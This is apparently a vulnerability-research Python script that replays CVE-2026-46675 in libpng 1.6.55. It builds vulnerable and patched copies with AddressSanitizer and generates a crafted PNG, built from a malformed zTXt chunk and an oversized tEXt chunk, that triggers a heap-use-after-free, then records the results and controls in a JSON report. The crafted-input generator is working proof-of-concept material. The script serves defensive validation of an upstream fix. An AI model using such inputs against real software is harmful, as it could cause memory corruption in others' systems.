#!/usr/bin/env python3
"""Build a local libpng source archive with ASan and replay CVE-2026-46675."""
from __future__ import annotations
import argparse, hashlib, json, os, shutil, struct, subprocess, tarfile, tempfile, zlib
from pathlib import Path
ROOT=Path(__file__).resolve().parents[2]
DRIVER=ROOT/"tests/fixtures/data_sensitive/cve_2026_46675/read_png_end.c"
FIX_PATCH=ROOT/"tests/fixtures/data_sensitive/cve_2026_46675/upstream-fix-aa77ef3.patch"
EXPECTED_ARCHIVE_SHA256="71a2c5b1218f60c4c6d2f1954c7eb20132156cae90bdb90b566c24db002782a6"
UPSTREAM_FIX_COMMIT="aa77ef38c17ab2fc1b41bec09fb973c6a386641d"
def sha256(data): return hashlib.sha256(data).hexdigest()
def make_png(path,text_size):
 out=bytearray(b"\x89PNG\r\n\x1a\n")
 def chunk(kind,data):
  out.extend(struct.pack(">I",len(data))); out.extend(kind); out.extend(data); out.extend(struct.pack(">I",zlib.crc32(kind+data)&0xffffffff))
 chunk(b"IHDR",struct.pack(">IIBBBBB",1,1,8,2,0,0,0))
 cmf=0x88; flg=next(v for v in range(256) if ((cmf<<8)|v)%31==0 and (v&0x20)==0)
 chunk(b"zTXt",b"Comment\x00\x00"+bytes((cmf,flg))+b"\x00"*16)
 chunk(b"tEXt",b"Comment\x00"+b"A"*text_size)
 chunk(b"IDAT",zlib.compress(b"\x00\x10\x20\x30")); chunk(b"IEND",b"")
 path.write_bytes(out); return sha256(bytes(out))
def extract_pinned_archive(archive,destination):
 data=archive.read_bytes(); digest=sha256(data)
 if digest!=EXPECTED_ARCHIVE_SHA256: raise ValueError(f"source archive SHA-256 mismatch: {digest}")
 with tarfile.open(archive,"r:gz") as tar:
  members=tar.getmembers()
  for member in members:
   path=Path(member.name)
   if path.is_absolute() or ".." in path.parts or (member.name != "libpng-1.6.55" and not member.name.startswith("libpng-1.6.55/")): raise ValueError(f"unsafe/unexpected archive member: {member.name}")
   if member.issym() or member.islnk() or member.isdev(): raise ValueError(f"unsupported archive member type: {member.name}")
  tar.extractall(destination,members=members)
 source=destination/"libpng-1.6.55"; version=(source/"png.h").read_text(encoding="utf-8",errors="replace")
 if 'PNG_LIBPNG_VER_STRING "1.6.55"' not in version: raise ValueError("archive does not identify itself as libpng 1.6.55")
 return digest
def build(source,build_dir):
 subprocess.run(["cmake","-S",str(source),"-B",str(build_dir),"-DPNG_SHARED=OFF","-DPNG_STATIC=ON","-DPNG_TESTS=OFF","-DPNG_TOOLS=OFF","-DCMAKE_BUILD_TYPE=Debug","-DCMAKE_C_FLAGS=-fsanitize=address -fno-omit-frame-pointer -g"],check=True,stdout=subprocess.PIPE,stderr=subprocess.STDOUT,text=True)
 subprocess.run(["cmake","--build",str(build_dir),"-j2"],check=True,stdout=subprocess.PIPE,stderr=subprocess.STDOUT,text=True)
 exe=build_dir/"read_png_end_asan"
 subprocess.run([os.environ.get("CC","gcc"),"-fsanitize=address","-fno-omit-frame-pointer","-g",f"-I{source}",f"-I{build_dir}",str(DRIVER),str(build_dir/"libpng16d.a"),"-lz","-lm","-o",str(exe)],check=True,stdout=subprocess.PIPE,stderr=subprocess.STDOUT,text=True)
 return exe
def run(binary,png,mode):
 env=dict(os.environ); env["ASAN_OPTIONS"]="detect_leaks=0:halt_on_error=0"
 result=subprocess.run([str(binary),str(png),mode],capture_output=True,text=True,env=env)
 output=result.stdout+result.stderr
 return {"mode":mode,"exit_code":result.returncode,"asan_heap_use_after_free":"ERROR: AddressSanitizer: heap-use-after-free" in output,"png_info_reached":"PNG_INFO_OK" in output,"png_rows_reached":"PNG_ROWS_OK" in output,"output":output}
def main():
 ap=argparse.ArgumentParser(); ap.add_argument("--source-tar",type=Path,required=True); ap.add_argument("--output",type=Path,default=ROOT/"research/data_sensitive/D30_LIBPNG_CVE_2026_46675_REPLAY.json"); args=ap.parse_args()
 with tempfile.TemporaryDirectory(prefix="ohscanner-d30-cve46675-") as temp:
  ws=Path(temp); archive_sha=extract_pinned_archive(args.source_tar.resolve(),ws); vuln_src=ws/"libpng-1.6.55"; fixed_src=ws/"libpng-1.6.55-fixed"; shutil.copytree(vuln_src,fixed_src)
  subprocess.run(["patch","--batch","-p1","-i",str(FIX_PATCH)],cwd=fixed_src,check=True,stdout=subprocess.PIPE,stderr=subprocess.STDOUT,text=True)
  vuln=build(vuln_src,ws/"build-vulnerable"); fixed=build(fixed_src,ws/"build-fixed")
  large=ws/"invalid-ancillary-large-text.png"; short=ws/"invalid-ancillary-short-text.png"; large_hash=make_png(large,512*1024); short_hash=make_png(short,4)
  rounds=[]
  for index in range(1,4):
   results={"affected_source":run(vuln,large,"read-end"),"upstream_fix_applied":run(fixed,large,"read-end"),"read_rows_before_end_control":run(vuln,large,"read-rows"),"short_text_no_reallocation_control":run(vuln,short,"read-end")}
   if not results["affected_source"]["asan_heap_use_after_free"] or not results["affected_source"]["png_info_reached"]: raise SystemExit(f"round {index}: affected source did not reproduce the expected ASan heap-use-after-free")
   for name,result in results.items():
    if name!="affected_source" and result["asan_heap_use_after_free"]: raise SystemExit(f"round {index}: unexpected ASan UAF in {name}")
   rounds.append({"round":index,"results":results})
  document={"schema":1,"experiment":"D30 libpng CVE-2026-46675 ASan component replay","source":{"component_version":"1.6.55","archive_sha256":archive_sha,"origin":"G-drive OpenHarmony third_party_libpng tracked build input","upstream_fix_commit":UPSTREAM_FIX_COMMIT,"fixed_tree_method":"apply exact upstream pngrutil.c fix commit to extracted copy of pinned 1.6.55 source archive"},"runtime":{"compiler":"gcc with AddressSanitizer","host_architecture":"x86_64","libpng_config":"static debug build; PNG_TESTS=OFF; PNG_TOOLS=OFF","poc_input_sha256":large_hash,"control_input_sha256":short_hash,"vulnerable_call_order":"png_read_info then png_read_end without reading rows"},"rounds":rounds,"interpretation":"Confirmed component-level heap-use-after-free in pinned libpng 1.6.55 archive under advisory call sequence. Applying the upstream fix removes the ASan finding on the same input. This does not establish an OpenHarmony product build, reachable application call sequence, or product vulnerability.","product_status":"unknown","validated_vulnerability":0}
  args.output.parent.mkdir(parents=True,exist_ok=True); args.output.write_text(json.dumps(document,indent=2,sort_keys=True)+"\n",encoding="utf-8")
  first=rounds[0]["results"]
  print(json.dumps({"rounds":len(rounds),"archive_sha256":archive_sha,"affected_asan_uaf":first["affected_source"]["asan_heap_use_after_free"],"fixed_asan_uaf":first["upstream_fix_applied"]["asan_heap_use_after_free"],"read_rows_control_asan_uaf":first["read_rows_before_end_control"]["asan_heap_use_after_free"],"short_text_control_asan_uaf":first["short_text_no_reallocation_control"]["asan_heap_use_after_free"],"output":str(args.output)},sort_keys=True))
 return 0
if __name__=="__main__": raise SystemExit(main())
